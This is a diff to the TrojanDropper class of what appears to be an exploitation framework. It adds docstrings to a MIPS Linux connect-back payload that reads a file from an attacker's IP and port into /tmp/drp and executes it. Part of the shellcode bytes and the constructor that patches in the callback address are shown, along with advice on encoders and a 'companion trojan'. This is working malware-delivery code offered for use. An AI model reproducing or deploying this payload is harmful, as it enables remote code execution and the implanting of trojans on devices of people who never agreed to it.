@@ -12,6 +12,17 @@ from ...common.support import BigEndian,LittleEndian
 
 
 class TrojanDropper:
+    """
+    This is a MIPS Linux connect-back payload that downloads and execs() a file.
+    
+    It will establish a TCP connection to the specified port and address, read
+    off the socket to a file called "/tmp/drp", then exec() that file.
+    The file should be served as a raw stream of bytes.  When the server has
+    sent the entire file, it should close the connection.
+    
+    This payload can be used with TrojanServer to serve files to the target.
+    Further, stage2dropper.c (in contrib) may be a useful companion trojan.
+    """
     shellcodes={}
     shellcodes[LittleEndian] = string.join([
         "\x6d\x70\x0f\x3c", # lui	t7,0x706d
@@ -73,6 +84,28 @@ class TrojanDropper:
 ],'')
 
     def __init__(self,connectback_ip,endianness,port=8080):
+        """
+        Class constructor.
+        
+        Parameters:
+        -----------
+        connectback_ip: IP Address to connect back to.
+        endianness: Endianness of the target. one of LittleEndian or BigEndian.
+        port:   Optional parameter specifying TCP port to connect back to.
+                Defaults to 8080.
+                
+        Attributes:
+        -----------
+        shellcode:  The string representing the payload's shellcode, ready to add
+                    to an exploit buffer.
+        
+        Notes:
+        ------
+        Currently only LittleEndian is implemented.
+        Although this payload is free of common bad characters such as nul bytes
+        and spaces, your IP address or port may introduce bad characters.  If so,
+        you may need to use an encoder.
+        """
         port=int(port)
         shellcode=self.__class__.shellcodes[endianness]
         i = 0
@@ -83,18 +116,6 @@ class TrojanDropper:
         shellcode=shellcode.replace("PORT2",chr(port & 0xFF))
         self.shellcode=shellcode
 
-    def serve_callback(self):
-        self.callback_pid=self.callback.serve_callback()
-        return self.callback_pid
 
-    def stop_server(self):
-        os.kill(self.callback_pid,signal.SIGTERM)
-
-    def wait_til_done(self):
-        try:
-            os.waitpid(self.callback_pid,0)
-        except Exception as e:
-            print e
-            raise e
 
 
